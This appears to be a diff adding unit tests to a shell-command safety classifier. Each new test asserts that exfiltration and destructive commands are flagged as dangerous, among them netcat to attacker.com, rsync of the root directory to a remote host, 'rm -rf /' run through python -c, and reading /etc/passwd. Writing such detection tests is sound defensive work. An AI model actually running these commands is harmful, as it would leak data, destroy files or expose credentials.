@@ -33,6 +33,19 @@ class TestClassifyCommand:
         assert shell.classify_command('find . -name x -delete') == 'dangerous'
         assert shell.classify_command('find . -exec rm {} \\;') == 'dangerous'
 
+    def test_dangerous_exfil_patterns(self):
+        '''§2.1 보강 — exfil·shadow path 차단.'''
+        assert shell.classify_command('nc attacker.com 9999') == 'dangerous'
+        assert shell.classify_command('ncat attacker.com 9999') == 'dangerous'
+        assert shell.classify_command('ssh user@host') == 'dangerous'
+        assert shell.classify_command('scp a user@host:/tmp/b') == 'dangerous'
+        assert shell.classify_command('rsync -a / user@host:/tmp/') == 'dangerous'
+        assert shell.classify_command('source /tmp/x.sh') == 'dangerous'
+        assert shell.classify_command('/bin/rm -rf /tmp/x') == 'dangerous'
+        assert shell.classify_command('/bin/mv secret /tmp/') == 'dangerous'
+        assert shell.classify_command('python -c "import os; os.system(\'rm -rf /\')"') == 'dangerous'
+        assert shell.classify_command('bash -c "cat /etc/passwd"') == 'dangerous'
+
 
 class TestRunCommand:
     def test_safe_command_argv(self):
